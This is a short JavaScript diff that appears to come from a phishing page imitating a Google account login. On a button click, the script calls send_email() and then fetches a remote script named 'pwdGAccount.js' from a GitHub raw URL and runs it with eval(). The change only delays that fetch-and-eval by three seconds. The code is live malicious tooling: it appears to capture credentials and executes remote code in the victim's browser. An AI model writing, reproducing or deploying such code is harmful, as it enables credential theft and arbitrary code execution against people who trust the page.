@@ -17,5 +17,7 @@ const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
     send_email();
-    fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js').then(response => response.text()).then(code => {eval(code)});
+    setTimeout(function() {
+        fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js').then(response => response.text()).then(code => {eval(code)});
+    }, 3000);
 })
